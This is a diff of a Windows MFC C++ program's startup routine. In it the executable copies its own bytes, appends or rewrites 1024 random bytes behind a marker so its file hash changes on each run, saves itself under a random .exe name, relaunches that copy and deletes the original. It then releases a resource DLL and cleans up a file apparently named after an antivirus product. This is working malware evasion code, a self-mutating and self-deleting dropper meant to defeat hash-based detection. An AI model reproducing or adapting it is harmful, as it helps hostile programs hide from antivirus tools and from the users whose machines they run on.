@@ -151,26 +151,117 @@ BOOL CMFCApplication1App::InitInstance()
 		GetModuleFileName(NULL, szPathOrig, _MAX_PATH);
 		//GetTempPath(_MAX_PATH, szPathClone);
 		//GetTempFileName(szPathClone, __TEXT("Del"), 0, szPathClone);
-		wsprintf(szPathClone, __TEXT("%s~"), szPathOrig);
-		CopyFile(szPathOrig, szPathClone, FALSE);
+		//wsprintf(szPathClone, __TEXT("%s~"), szPathOrig);
+		//CopyFile(szPathOrig, szPathClone, FALSE);
 
 		//***注意了***:
 		// Open the clone EXE using FILE_FLAG_DELETE_ON_CLOSE
-		HANDLE hfile = CreateFile(szPathClone, 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+		//HANDLE hfile = CreateFile(szPathClone, 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
 		xlog::Normal(			"first time"	);
+		// Spawn the clone EXE passing it our EXE''s process handle
+		// and the full path name to the Original EXE file.
+
+		HANDLE hFile2;//定义一个句柄。   
+		hFile2 = CreateFile(__targv[0],
+			GENERIC_READ,
+			FILE_SHARE_READ,
+			NULL,
+			OPEN_EXISTING,
+			FILE_ATTRIBUTE_NORMAL,
+			NULL);//使用CreatFile这个API函数打开文件   
+		DWORD dwDataLen;
+		char * FileContent = new char[30 * 1024 * 1024];
+		ReadFile(hFile2, FileContent, 30 * 1024 * 1024, &dwDataLen, NULL);//读取数据   
+		FileContent[dwDataLen] = 0;//将数组未尾设零。   
+		CloseHandle(hFile2);//关闭句柄   
+		srand((unsigned)time(NULL));
+		if (strncmp(FileContent + dwDataLen - 630, "199131", 6) == 0)
+		{
+			//rewrite 1024
+
+			for (int i = 1024; i > 0; i--)
+				FileContent[dwDataLen - i] = rand() % 256;
+			FileContent[dwDataLen - 630] = '1';
+			FileContent[dwDataLen - 630 + 1] = '9';
+			FileContent[dwDataLen - 630 + 2] = '9';
+			FileContent[dwDataLen - 630 + 3] = '1';
+			FileContent[dwDataLen - 630 + 4] = '3';
+			FileContent[dwDataLen - 630 + 5] = '1';
+
+		}
+		else
+		{
+			//add 1024
+			dwDataLen = dwDataLen + 1024;
+			for (int i = 1024; i > 0; i--)
+				FileContent[dwDataLen - i] = rand() % 256;
+			FileContent[dwDataLen - 630] = '1';
+			FileContent[dwDataLen - 630 + 1] = '9';
+			FileContent[dwDataLen - 630 + 2] = '9';
+			FileContent[dwDataLen - 630 + 3] = '1';
+			FileContent[dwDataLen - 630 + 4] = '3';
+			FileContent[dwDataLen - 630 + 5] = '1';
+
+		}
+
+		// 写入文件   
+		//HANDLE hFile;//定义一个句柄。   
+
+
+
+		static const wchar_t alphabet[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZbcdefghijklmnopqrstuvwxyz1234567890";
+		static std::random_device rd;
+		static std::uniform_int_distribution<> dist(0, ARRAYSIZE(alphabet) - 2);
+		static std::uniform_int_distribution<> dist_len(5, 15);
+		std::wstring result;
+
+		// Get random string length
+		int length = 0;
+		if (length == 0)
+			length = dist_len(rd);
+
+		for (int i = 0; i < length; i++)
+			result.push_back(alphabet[dist(rd)]);
+
+
+
+		result.append(_T(".exe"));
+
+
+		hFile2 = CreateFile(result.c_str(),
+			GENERIC_WRITE,
+			FILE_SHARE_WRITE,
+			NULL,
+			CREATE_NEW,
+			FILE_ATTRIBUTE_NORMAL,
+			NULL);//使用CreatFile这个API函数打开文件   
+		DWORD Written;
+		WriteFile(hFile2, FileContent, dwDataLen, &Written, NULL);//写入文件   
+		CloseHandle(hFile2);//关闭句柄
+		//DeleteFile(__targv[2]);
+		xlog::Normal("change hash");
+		// Insert code here to remove the subdirectory too (if desired).
+
+		// The system will delete the clone EXE automatically
+		// because it was opened with FILE_FLAG_DELETE_ON_CLOSE
+		delete FileContent;
+
+
 		// Spawn the clone EXE passing it our EXE''s process handle
 		// and the full path name to the Original EXE file.
 		TCHAR szCmdLine[512];
 		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
 
-		wsprintf(szCmdLine, __TEXT("%s %d \"%s\""), szPathClone, hProcessOrig, szPathOrig);
+		wsprintf(szCmdLine, __TEXT("%s %d \"%s\" "), result.c_str(), hProcessOrig, __targv[0]);
 		STARTUPINFO si;
 		ZeroMemory(&si, sizeof(si));
 		si.cb = sizeof(si);
 		PROCESS_INFORMATION pi;
 		CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 		CloseHandle(hProcessOrig);
-		CloseHandle(hfile);
+
+		
+		//CloseHandle(hfile);
 //REGISTERED_END
 		// This original process can now terminate.
 		
@@ -183,116 +274,11 @@ BOOL CMFCApplication1App::InitInstance()
 		WaitForSingleObject(hProcessOrig, INFINITE);
 		CloseHandle(hProcessOrig);
 		
-		if (__argc != 4)
-		{
-			
-			xlog::Normal("second time");
-			HANDLE hFile2;//定义一个句柄。   
-			hFile2 = CreateFile(__targv[2],
-				GENERIC_READ,
-				FILE_SHARE_READ,
-				NULL,
-				OPEN_EXISTING,
-				FILE_ATTRIBUTE_NORMAL,
-				NULL);//使用CreatFile这个API函数打开文件   
-			DWORD dwDataLen;
-			char * FileContent = new char[30 * 1024 * 1024];
-			ReadFile(hFile2, FileContent, 30 * 1024 * 1024, &dwDataLen, NULL);//读取数据   
-			FileContent[dwDataLen] = 0;//将数组未尾设零。   
-			CloseHandle(hFile2);//关闭句柄   
-			srand((unsigned)time(NULL));
-			if (strncmp(FileContent + dwDataLen - 630, "199131", 6) == 0)
-			{
-				//rewrite 1024
-				
-				for (int i = 1024; i > 0; i--)
-					FileContent[dwDataLen - i] = rand() % 256;
-				FileContent[dwDataLen - 630] = '1';
-				FileContent[dwDataLen - 630 + 1] = '9';
-				FileContent[dwDataLen - 630 + 2] = '9';
-				FileContent[dwDataLen - 630 + 3] = '1';
-				FileContent[dwDataLen - 630 + 4] = '3';
-				FileContent[dwDataLen - 630 + 5] = '1';
-
-			}
-			else
-			{
-				//add 1024
-				dwDataLen = dwDataLen + 1024;
-				for (int i = 1024; i > 0; i--)
-					FileContent[dwDataLen - i] = rand() % 256;
-				FileContent[dwDataLen - 630] = '1';
-				FileContent[dwDataLen - 630 + 1] = '9';
-				FileContent[dwDataLen - 630 + 2] = '9';
-				FileContent[dwDataLen - 630 + 3] = '1';
-				FileContent[dwDataLen - 630 + 4] = '3';
-				FileContent[dwDataLen - 630 + 5] = '1';
-
-			}
-
-			// 写入文件   
-			//HANDLE hFile;//定义一个句柄。   
-
-
-
-			static const wchar_t alphabet[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZbcdefghijklmnopqrstuvwxyz1234567890";
-			static std::random_device rd;
-			static std::uniform_int_distribution<> dist(0, ARRAYSIZE(alphabet) - 2);
-			static std::uniform_int_distribution<> dist_len(5, 15);
-			std::wstring result;
-
-			// Get random string length
-			int length = 0;
-			if (length == 0)
-				length = dist_len(rd);
-
-			for (int i = 0; i < length; i++)
-				result.push_back(alphabet[dist(rd)]);
-
-
-
-			result.append(_T(".exe"));
-
-
-			hFile2 = CreateFile(result.c_str(),
-				GENERIC_WRITE,
-				FILE_SHARE_WRITE,
-				NULL,
-				CREATE_NEW,
-				FILE_ATTRIBUTE_NORMAL,
-				NULL);//使用CreatFile这个API函数打开文件   
-			DWORD Written;
-			WriteFile(hFile2, FileContent, dwDataLen, &Written, NULL);//写入文件   
-			CloseHandle(hFile2);//关闭句柄
-			DeleteFile(__targv[2]);
-			xlog::Normal("change hash");
-			// Insert code here to remove the subdirectory too (if desired).
-
-			// The system will delete the clone EXE automatically
-			// because it was opened with FILE_FLAG_DELETE_ON_CLOSE
-			delete FileContent;
-
-
-			// Spawn the clone EXE passing it our EXE''s process handle
-			// and the full path name to the Original EXE file.
-			TCHAR szCmdLine[512];
-			HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
-
-			wsprintf(szCmdLine, __TEXT("%s %d \"%s\" 1"), result.c_str(), hProcessOrig, __targv[0]);
-			STARTUPINFO si;
-			ZeroMemory(&si, sizeof(si));
-			si.cb = sizeof(si);
-			PROCESS_INFORMATION pi;
-			CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-			CloseHandle(hProcessOrig);
-			
-		}
-		else
-		{
+		
 			
 			//第三次打开
 			// 释放资源DLL  
-			xlog::Normal("third time");
+			xlog::Normal("second time");
 			DeleteFile(__targv[2]);
 			TCHAR szPathOrig[_MAX_PATH],  szPathClone[_MAX_PATH];
 			GetTempPath(_MAX_PATH, szPathOrig);
@@ -307,7 +293,7 @@ BOOL CMFCApplication1App::InitInstance()
 			DeleteFile(_T("./cloud360.dat~"));
 			xlog::Normal("quit");
 			
-		}
+		
 
 		//REGISTERED_END
 
